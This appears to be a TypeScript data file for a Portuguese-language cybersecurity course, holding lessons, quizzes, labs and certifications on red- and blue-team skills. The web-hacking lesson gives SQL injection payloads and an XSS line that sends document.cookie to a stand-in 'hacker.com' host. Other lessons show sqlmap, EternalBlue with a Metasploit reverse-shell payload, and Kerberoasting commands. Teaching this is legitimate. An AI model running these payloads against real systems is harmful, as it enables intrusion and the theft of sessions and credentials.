export interface Lesson {
    id: string
    title: string
    duration: string
    xp: number
    content: string
    videoId?: string
    codeExample?: string
    nistTags?: string[] // Identify, Protect, Detect, Respond, Recover
    mitreTechniques?: string[] // e.g., T1566
}

export interface QuizQuestion {
    id: string
    question: string
    options: string[]
    correct: number
    explanation: string
    difficulty?: 'easy' | 'medium' | 'hard'
}

export interface Level {
    id: number
    title: string
    description: string
    path: 'shared' | 'red' | 'blue' | 'purple'
    xpRequired: number
    lessons: Lesson[]
    quiz: QuizQuestion[]
    labTitle: string
    labDescription: string
    labLink: string
    badge: string
}

export const CURRICULUM: Level[] = [
    {
        id: 1,
        title: 'Fundamentos de Cybersegurança',
        description: 'Redes, Linux, CIA Triad — a base de tudo.',
        path: 'shared',
        xpRequired: 0,
        badge: 'script-kiddie',
        labTitle: 'OverTheWire: Bandit',
        labDescription: 'Pratique comandos Linux básicos no OverTheWire Bandit. Resolva os primeiros 5 níveis.',
        labLink: 'https://overthewire.org/wargames/bandit/',
        lessons: [
            {
                id: 'l1-1', title: 'Modelo OSI e TCP/IP Profundo', duration: '35 min', xp: 100,
                content: `## O Modelo OSI: A Linguagem das Redes

O modelo OSI (Open Systems Interconnection) é a base de toda comunicação. Para um hacker, entender o OSI não é apenas decorar camadas, é saber **onde** atacar e **como** os dados fluem.

### Visualização ASCII do Modelo OSI

\`\`\`text
+-------------------------------------------------------------+
| [7] APLICAÇÃO   | Interfaces (HTTP, FTP, SMTP, DNS)          | -> INTERAÇÃO USUÁRIO
+-------------------------------------------------------------+
| [6] APRESENTAÇÃO | Tradução (SSL/TLS, ASCII, JPEG, Compressão) | -> FORMATAÇÃO
+-------------------------------------------------------------+
| [5] SESSÃO      | Gerenciamento (NetBIOS, RPC, Sockets)      | -> DIÁLOGO
+-------------------------------------------------------------+
| [4] TRANSPORTE  | End-to-End (TCP, UDP, Portas)              | -> SEGMENTOS
+-------------------------------------------------------------+
| [3] REDE        | Endereçamento Lógico (IP, Roteamento)      | -> PACOTES
+-------------------------------------------------------------+
| [2] ENLACE      | Endereçamento Físico (MAC, Switches)       | -> QUADROS (FRAMES)
+-------------------------------------------------------------+
| [1] FÍSICA      | Bitstream (Cabos, Rádio, Tensões)          | -> BITS
+-------------------------------------------------------------+
\`\`\`

### Protocolo IP e Portas
Imagine o IP como o endereço de um prédio e a porta como o número do apartamento.
- **Portas Bem Conhecidas (0-1023):** 22 (SSH), 80 (HTTP), 443 (HTTPS), 53 (DNS).
- **Portas Registradas (1024-49151):** 3306 (MySQL), 5432 (PostgreSQL).

### Handshake TCP (3-Way)
A base da conexão confiável. Como atacantes, usamos isso para "Scanning":
1. **SYN:** Cliente envia pedido de conexão.
2. **SYN-ACK:** Servidor responde que recebeu e está pronto.
3. **ACK:** Cliente confirma. Conexão ESTABELECIDA.

> [!IMPORTANT]
> Se enviarmos um SYN e recebermos um RST (Reset), a porta está FECHADA. Se recebermos SYN-ACK, a porta está ABERTA.`,
                videoId: 'placeholder',
                codeExample: `# Sniffing básico com tcpdump para ver o handshake
sudo tcpdump -i eth0 -n tcp port 80

# Usando o Nmap para ver se uma porta está aberta (SYN Scan)
sudo nmap -sS -p 80,443 alvos.com`
            },
            {
                id: 'l1-2', title: 'Dominação do Terminal Linux', duration: '45 min', xp: 150,
                content: `## Linux: O Poder do Root

No mundo hacker, se você não domina o terminal, você depende de ferramentas de terceiros (Script Kiddie). O Linux é modular e transparente, o que o torna a ferramenta perfeita.

### Top 20 Comandos de Sobrevivência

1.  **ls -lha**: Lista arquivos com permissões, dono e tamanho.
2.  **cd [dir]**: Navegação básica.
3.  **pwd**: Mostra o caminho absoluto atual.
4.  **cat / grep**: Ler arquivos e filtrar conteúdo especifico (ex: \`cat /etc/passwd | grep root\`).
5.  **find / -name "key.txt"**: Busca profunda em todo o sistema.
6.  **chmod / chown**: Altera permissões e donos (Essencial para Escalada de Privilégio).
7.  **sudo -l**: Checa o que seu usuário pode rodar como root.
8.  **ip addr**: Verifica endereços IP e interfaces.
9.  **ps aux**: Lista todos os processos rodando.
10. **kill -9 [PID]**: Encerra processos travados.
11. **ssh user@host**: Acesso remoto criptografado.
12. **scp file.txt user@host:/tmp**: Copia arquivos via rede.
13. **wget / curl**: Download de payloads diretamente da web.
14. **netstat -tunapl**: Lista portas abertas e conexões ativas.
15. **df -h**: Checa espaço em disco.
16. **history**: Mostra comandos rodados anteriormente.
17. **head / tail**: Lê o início ou fim de arquivos gigantes (logs).
18. **nmtui**: Interface gráfica simples para Wi-Fi/Rede via terminal.
19. **man [comando]**: O manual supremo. Use \`man nmap\`.
20. **top / htop**: Monitor de processos em tempo real.

### Gerenciamento de Permissões
Linux usa o sistema Read (4), Write (2), Execute (1).
- **7 (4+2+1):** Tudo (Leitura, Escrita, Execução)
- **5 (4+1):** Leitura e Execução
- **0:** Nada

\`\`\`bash
chmod 700 secret.sh # Apenas o dono pode ler/escrever/rodar
\`\`\``,
                videoId: 'placeholder',
                codeExample: `# BASH SCRIPT DE AUTOMAÇÃO BÁSICA
#!/bin/bash
echo "[+] Coletando informações do sistema..."
date
whoami
uname -a
ip addr | grep "inet "
echo "[+] Verificando portas abertas..."
netstat -tunapl | grep LISTEN`
            },
            {
                id: 'l1-3', title: 'CIA Triad e Estudo de Caso WannaCry', duration: '25 min', xp: 80,
                content: `## A Tríade da Segurança (CIA)

Toda defesa ou ataque foca em um desses três pilares:

### 1. Confidentiality (Confidencialidade)
Somente quem tem permissão pode ver.
- **Exemplo:** Senhas, mensagens privadas.
- **Ferramenta:** Criptografia Forte.

### 2. Integrity (Integridade)
O dado não foi alterado no caminho.
- **Exemplo:** Um arquivo de update de software.
- **Ferramenta:** Hash (SHA-256).

### 3. Availability (Disponibilidade)
O sistema deve estar online quando o usuário precisar.
- **Exemplo:** Servidor de banco.
- **Ataque:** DDoS (Distributed Denial of Service).

---

### Estudo de Caso: Ransomware WannaCry (2017)
O WannaCry foi um ataque massivo que quebrou os três pilares:
- **Disponibilidade:** Cifrou os arquivos, impedindo o acesso (Hospitais pararam!).
- **Integridade:** Alterou os dados originais para uma versão cifrada.
- **Confidencialidade:** (Parcial) Os dados podiam ser exfiltrados antes da cifra.

**Vetor de Ataque:** Usou a vulnerabilidade **EternalBlue** (SMB) vazada da NSA.
**Lição:** Manter sistemas atualizados (patching) é a defesa número 1.`,
                videoId: 'placeholder'
            }
        ],
        quiz: [
            { id: 'q1-1', question: 'Qual camada do modelo OSI é responsável pelo endereçamento IP?', options: ['Camada 2 - Enlace', 'Camada 3 - Rede', 'Camada 4 - Transporte', 'Camada 7 - Aplicação'], correct: 1, explanation: 'A Camada 3 (Rede) é responsável pelo endereçamento lógico (IP) e roteamento de pacotes.' },
            { id: 'q1-2', question: 'O handshake TCP de 3 vias funciona na sequência:', options: ['SYN → ACK → FIN', 'SYN → SYN-ACK → ACK', 'RST → SYN → ACK', 'ACK → SYN → FIN'], correct: 1, explanation: 'O three-way handshake TCP é: SYN (cliente) → SYN-ACK (servidor) → ACK (cliente).' },
            { id: 'q1-3', question: 'Qual algoritmo de hash é considerado SEGURO hoje?', options: ['MD5', 'SHA1', 'SHA-256', 'CRC32'], correct: 2, explanation: 'MD5 e SHA1 foram quebrados. SHA-256 (e superiores) são considerados seguros atualmente.' },
            { id: 'q1-4', question: 'O pilar de Disponibilidade (Availability) da CIA Triad protege contra:', options: ['Vazamento de dados', 'Alteração de arquivos', 'Ataques DDoS', 'Engenharia social'], correct: 2, explanation: 'Disponibilidade garante que serviços estejam acessíveis. DDoS é o principal ataque a esse pilar.' },
            { id: 'q1-5', question: 'Qual comando Linux mostra as portas abertas no sistema?', options: ['ls -la /ports', 'netstat -tunapl', 'chmod +x ports', 'grep -r "ports" /etc'], correct: 1, explanation: 'netstat -tunapl (ou ss -tunapl) mostra todas as portas TCP/UDP abertas com processos.' },
            { id: 'q1-11', question: 'No modelo OSI, em qual camada operam os repetidores e cabos?', options: ['Física', 'Enlace', 'Rede', 'Sessão'], correct: 0, explanation: 'A Camada Física trata dos aspectos elétricos e físicos da transmissão de bits.' },
            { id: 'q1-12', question: 'O que o WannaCry utilizou para se espalhar rapidamente?', options: ['E-mails de phishing', 'Vulnerabilidade EternalBlue (SMB)', 'Pen drives infectados', 'Senhas padrão de admin'], correct: 1, explanation: 'O WannaCry explorou o EternalBlue, um exploit de SMB que permitia execução remota de código.' }
        ]
    },
    {
        id: 2, title: 'Reconhecimento de Elite', description: 'Nmap, OSINT, footprinting — encontre alvos antes de atacar.',
        path: 'red', xpRequired: 500, badge: 'recon-master',
        labTitle: 'TryHackMe: Nmap Room', labDescription: 'Pratique scanning de portas e detecção de serviços.', labLink: 'https://tryhackme.com/room/furthernmap',
        lessons: [
            {
                id: 'l2-1', title: 'Nmap Profissional: Além do Básico', duration: '40 min', xp: 120,
                content: `## Nmap (Network Mapper) para Pentesters

O Nmap é a ferramenta de rede mais importante. Um scan mal feito pode derrubar um servidor ou alertar o IDS/Firewall.

### Exemplos de Comandos Reais

- **Scan de descoberta rápida:**
  \`\`\`bash
  nmap -sn 192.168.1.0/24 # Ping sweep (sem scan de portas)
  \`\`\`

- **Scan Completo e "Silencioso" (TCP SYN):**
  \`\`\`bash
  sudo nmap -sS -p- -T3 10.10.10.10
  # -sS: SYN Scan (mais rápido e discreto)
  # -p-: Escaneia TODAS as 65.535 portas
  # -T3: Velocidade normal (T4 ou T5 são mais agressivos e barulhentos)
  \`\`\`

- **Detecção de Versão e Scripts Padrão:**
  \`\`\`bash
  nmap -sV -sC 10.10.10.10
  # -sV: Tenta descobrir VERSÃO do serviço (ex: Apache 2.4.18)
  # -sC: Roda scripts default do Nmap (NSE) para testar vuln. comuns
  \`\`\`

- **Evasão de Firewall (Fragmentação):**
  \`\`\`bash
  nmap -f 10.10.10.10 # Fragmenta pacotes IP
  \`\`\`

> [!TIP]
> Use sempre \`-oA filename\` para salvar os resultados em 3 formatos (Normal, Grepable e XML). Você vai precisar disso no seu relatório final!`,
                codeExample: `# SCAN DE BANCO DE DADOS
nmap -p 3306 --script mysql-info,mysql-empty-password 10.10.10.5`
            },
            {
                id: 'l2-2', title: 'Payloads SQLi e XSS na Prática', duration: '35 min', xp: 100,
                content: `## Injeção de Código: Web Hacking

### 1. SQL Injection (SQLi)
Manipulação de queries de banco de dados.
- **Bypass de Login Clássico:** \`' OR 1=1 --\`
- **Union Based:** Serve para extrair dados de outras tabelas.
  \`' UNION SELECT 1,2,username,password FROM users--\`

### 2. Cross-Site Scripting (XSS)
Injeção de JavaScript no navegador da vítima.
- **Stored XSS:** O script fica guardado no banco (ex: um comentário).
  \`<script>fetch('http://hacker.com/steal?cookie='+document.cookie)</script>\`
- **Reflected XSS:** O script vem em um parâmetro da URL.
  \`?search=<script>alert('XSS')</script>\`

---

### Processo de Exploração Web
1. **Spidering:** Mapear todas as URLs.
2. **Fuzzing:** Testar caracteres especiais (\`, \', <, >) em campos de texto.
3. **Exploração:** Usar o payload correto para extrair dados ou executar comandos.`,
                codeExample: `# Ferramenta automatizada para SQLi
sqlmap -u "http://alvo.com/product.php?id=1" --batch --dbs`
            }
        ],
        quiz: [
            { id: 'q2-1', question: 'Qual flag do Nmap detecta versões de serviços?', options: ['-sS', '-sV', '-sC', '-sU'], correct: 1, explanation: '-sV (version detection) tenta identificar a versão dos serviços em portas abertas.' },
            { id: 'q2-11', question: 'Qual o objetivo de um "Ping Sweep" no Nmap?', options: ['Escaneia vulnerabilidades web', 'Identifica hosts ativos em uma rede sem escanear portas', 'Quebra senhas de admin', 'Derruba o servidor'], correct: 1, explanation: 'Ping sweep (-sn) identifica quais IPs estão "vivos" na rede antes de um scan mais detalhado.' }
        ]
    },
    {
        id: 2, title: 'Defesa e SOC Moderno', description: 'Wireshark, análise de logs, detectar anomalias em tráfego.',
        path: 'blue', xpRequired: 500, badge: 'log-analyst',
        labTitle: 'Análise de PCAP com Wireshark', labDescription: 'Analise capturas de pacotes reais e identifique comportamentos suspeitos.', labLink: 'https://www.malware-traffic-analysis.net/',
        lessons: [
            {
                id: 'lb2-1', title: 'Filtros de Elite no Wireshark', duration: '30 min', xp: 120,
                content: `## Perícia em Rede com Wireshark

O Wireshark permite ver cada bit que passa pelo cabo. Como analista de SOC, você precisa filtrar o barulho.

### Principais Filtros de Display

| Alvo | Filtro |
|------|--------|
| **HTTP com Senhas** | \`http contains "password" || http.authbasic\` |
| **IP do Atacante** | \`ip.src == 192.168.1.10\` |
| **Portas de Atacante** | \`tcp.port == 4444 || tcp.port == 8888\` |
| **Flag SYN Ativa** | \`tcp.flags.syn == 1 && tcp.flags.ack == 0\` |
| **Erros de DNS** | \`dns.flags.rcode != 0\` |

### Identificando Exfiltração de Dados
Se você vê um host interno enviando gigabytes de tráfego para um IP desconhecido via HTTPS ou ICMP, você provavelmente tem um problema sério.

---

### Fluxo de Análise (Pcap)
1. **Statistics > Conversations:** Veja quem está falando mais com quem.
2. **Statistics > Protocol Hierarchy:** Veja qual protocolo domina a rede.
3. **File > Export Objects > HTTP:** Tente recuperar arquivos baixados pelo malware.`,
                codeExample: `# Filtro para ver requests de DNS suspeitos (Tunneling)
dns.qry.name.len > 20`
            }
        ],
        quiz: [
            { id: 'qb2-1', question: 'Onde ficam os logs de autenticação SSH no Linux?', options: ['/var/log/ssh.log', '/var/log/auth.log', '/etc/ssh/logs', '/proc/ssh'], correct: 1, explanation: '/var/log/auth.log contém todos os eventos de autenticação incluindo SSH, sudo e PAM.' },
            { id: 'qb2-11', question: 'No Wireshark, o que indica um possível Port Scan?', options: ['Muitos pacotes HTTP 200 OK', 'Muitos pacotes SYN vindos de um único IP para várias portas', 'Latência alta no DNS', 'Falta de tráfego ICMP'], correct: 1, explanation: 'Uma inundação de SYNs para portas variadas é o padrão clássico de um scanner.' }
        ]
    },
    {
        id: 3, title: 'Invasão Avançada & Persistência', description: 'Metasploit, Reverse Shells e Pivoting.',
        path: 'red', xpRequired: 1500, badge: 'pentester-elite',
        labTitle: 'TryHackMe: Metasploit Intro', labDescription: 'Use o Metasploit para explorar uma máquina vulnerável.', labLink: 'https://tryhackme.com/room/rpmetasploit',
        lessons: [
            {
                id: 'l3-1', title: 'Exploração com Metasploit (MSF)', duration: '50 min', xp: 200,
                nistTags: ['Protect', 'Detect'], mitreTechniques: ['T1210', 'T1595'],
                content: `## Metasploit Framework (MSF)
O MSF é a "Estrela da Morte" do pentest. Ele automatiza a exploração de vulnerabilidades conhecidas.
 
### Estrutura do MSF:
- **Exploits:** O código que aproveita a vulnerabilidade.
- **Payloads:** O que roda após o exploit (Shell, Meterpreter).
- **Auxiliary:** Scanners e fuzzers.
- **Post:** Pós-exploração (dumping de hashes).`,
                codeExample: `# Comando básico
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.5
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.10.2
exploit`
            }
        ],
        quiz: [{ id: 'q3-1', question: 'O que é um Meterpreter?', options: ['Um firewall', 'Um payload avançado extensível', 'Um tipo de rede', 'Um antivírus'], correct: 1, explanation: 'Meterpreter é um payload dinâmico que permite controle total na pós-exploração.' }]
    },
    {
        id: 4, title: 'Cloud Security: Dominação AWS', description: 'Segurança em Nuvem, AWS IAM e Misconfigurations.',
        path: 'purple', xpRequired: 3000, badge: 'log-analyst',
        labTitle: 'AWS CloudGoat: IAM Privilege Escalation', labDescription: 'Explore falhas de IAM em um ambiente AWS controlado.', labLink: 'https://github.com/RhinoSecurityLabs/cloudgoat',
        lessons: [
            {
                id: 'l4-1', title: 'Ataques a IAM e S3 Buckets', duration: '45 min', xp: 250,
                nistTags: ['Protect', 'Detect'], mitreTechniques: ['T1530', 'T1098'],
                content: `## Cloud Security 2026: A Nova Fronteira
A maioria das empresas modernas está na nuvem. O foco mudou de "quebrar firewalls" para "roubar chaves de acesso (Tokens)".
 
### Vetores Comuns:
1. **Buckets S3 Expostos:** Dados sensíveis abertos ao público.
2. **IAM Over-privileged:** Usuários com permissões de Admin desnecessárias.
3. **SSRF:** Roubo de metadados da instância (Tokens de STS).`,
                codeExample: `# Escaneando buckets abertos
aws s3 ls s3://nome-do-alvo --no-sign-request`
            }
        ],
        quiz: [{ id: 'q4-1', question: 'Qual o maior risco em ambientes AWS?', options: ['Cabo de rede solto', 'IAM com permissões excessivas', 'Falta de monitor', 'Teclado sem fio'], correct: 1, explanation: 'Permissões excessivas no IAM permitem que um atacante escale privilégios rapidamente.' }]
    },
    {
        id: 5, title: 'Movimentação Lateral & Active Directory', description: 'Kerberoasting, Bloodhound e Dominação de Domínio.',
        path: 'red', xpRequired: 5000, badge: 'ad-hunter',
        labTitle: 'Simulação AD: Kerberoasting', labDescription: 'Extraia hashes de serviços de um Controlador de Domínio simulado.', labLink: '#',
        lessons: [
            {
                id: 'l5-1', title: 'Exploração de Protocolos Windows', duration: '55 min', xp: 300,
                nistTags: ['Protect', 'Detect'], mitreTechniques: ['T1558.003', 'T1484'],
                content: `## O Coração das Redes Corporativas: Active Directory (AD)
Atacar o AD é o objetivo final de quase todo pentest interno. Se você controla o AD, você controla a empresa.
 
### Técnicas de "Quick Win":
1. **AS-REP Roasting:** Buscar usuários que não precisam de pré-autenticação Kerberos.
2. **Kerberoasting:** Solicitar tickets de serviço (TGS) e quebrá-los offline para obter senhas.
3. **Bloodhound:** Ferramenta gráfica para visualizar caminhos de ataque complexos até o Domain Admin.`,
                codeExample: `# Usando Impacket para Kerberoasting
GetUserSPNs.py -dc-ip 10.10.10.100 dom.local/user -request`
            }
        ],
        quiz: [{ id: 'q5-1', question: 'Qual ferramenta é usada para visualizar caminhos de ataque no AD?', options: ['Nmap', 'Bloodhound', 'Wireshark', 'Excel'], correct: 1, explanation: 'Bloodhound usa teoria dos grafos para mostrar como chegar ao Admin de Domínio.' }]
    },
    {
        id: 6, title: 'Forense Digital & Resposta a Incidentes (DFIR)', description: 'Análise de Memória RAM e Identificação de Malware.',
        path: 'blue', xpRequired: 5000, badge: 'forensics-master',
        labTitle: 'Volatility 3: Memory Dump Analysis', labDescription: 'Encontre um malware escondido em um dump de memória RAM.', labLink: 'https://github.com/volatilityfoundation/volatility3',
        lessons: [
            {
                id: 'l6-1', title: 'Análise de Memória com Volatility', duration: '60 min', xp: 350,
                nistTags: ['Detect', 'Respond'], mitreTechniques: ['T1012', 'T1129'],
                content: `## Além do Disco: A Verdade está na RAM
Muitos ataques modernos "fileless" não deixam rastros no HD. Analisar a memória RAM é crucial.
 
### Fluxo de Análise:
1. **Identificar Processos:** Ver nomes estranhos ou PIDs órfãos.
2. **Network Artifacts:** Ver conexões que o processo fez (C2 Beacons).
3. **Dumping Code:** Extrair o executável da memória para análise estática posterior.`,
                codeExample: `# Listando processos com Volatility 3
python3 vol.py -f memory.dmp windows.pslist`
            }
        ],
        quiz: [{ id: 'q6-1', question: 'Qual a vantagem de analisar a RAM em vez do disco?', options: ['É mais lento', 'Detecta ataques "fileless" (sem arquivo)', 'Não precisa de softwares', 'É mais barato'], correct: 1, explanation: 'Ataques que rodam apenas na memória não aparecem em scans de disco tradicionais.' }]
    }
]

export const BADGES = [
    { id: 'script-kiddie', name: 'Script Kiddie', icon: '💻', description: 'Completou os fundamentos', color: '#00ff41' },
    { id: 'recon-master', name: 'Recon Master', icon: '🔍', description: 'Mestre em reconhecimento', color: '#ffff00' },
    { id: 'log-analyst', name: 'Log Analyst', icon: '📊', description: 'Mestre em análise de logs', color: '#00d4ff' },
    { id: 'pentester-elite', name: 'Pentester Elite', icon: '💀', description: 'Concluiu o Red Team Lv3', color: '#ff0040' },
    { id: 'defender', name: 'Cyber Defender', icon: '🛡️', description: 'Concluiu o Blue Team Lv3', color: '#00d4ff' },
    { id: 'ad-hunter', name: 'AD Hunter', icon: '🌳', description: 'Mestre em Active Directory', color: '#ffcc00' },
    { id: 'forensics-master', name: 'Forensics Master', icon: '🔍', description: 'Especialista em Perícia', color: '#a855f7' },
    { id: 'oscp-sim', name: 'OSCP Simulator', icon: '🏆', description: 'Simulou a prova OSCP', color: '#ffbd2e' },
]

export const CERTS = [
    { id: 'security-plus', name: 'CompTIA Security+', path: 'Ambos', steps: 'Estude CompTIA SY0-701, faça labs Darril Gibson, agende pelo Pearson VUE', cost: 'R$ 2.500–3.500', difficulty: 'Iniciante-Intermediário', badgeId: 'defender' },
    { id: 'ejpt', name: 'eJPT (eLearnSecurity)', path: 'Red Team', steps: 'Curso gratuito INE Starter Pass, pratique labs, exame online prático', cost: 'R$ 500–800', difficulty: 'Iniciante', badgeId: 'recon-master' },
    { id: 'ceh', name: 'CEH (EC-Council)', path: 'Red Team', steps: 'Curso oficial EC-Council ou autoestudo, 5 anos exp ou treinamento', cost: 'R$ 3.000–4.500', difficulty: 'Intermediário', badgeId: 'pentester-elite' },
    { id: 'cysa', name: 'CompTIA CySA+', path: 'Blue Team', steps: 'Security+ primeiro, depois CySA+ CS0-003, foco em análise de logs e SIEM', cost: 'R$ 3.000–4.000', difficulty: 'Intermediário', badgeId: 'defender' },
    { id: 'cnd', name: 'CND (EC-Council)', path: 'Blue Team', steps: 'Curso CND oficial, labs de defesa de rede, exame teórico', cost: 'R$ 3.000–4.500', difficulty: 'Intermediário', badgeId: 'log-analyst' },
    { id: 'oscp', name: 'OSCP (Offensive Security)', path: 'Red Team Avançado', steps: 'Comprar PWK (PEN-200), completar 90 dias de labs, exame prático 24h', cost: 'R$ 6.000+', difficulty: 'Avançado', badgeId: 'oscp-sim' },
]
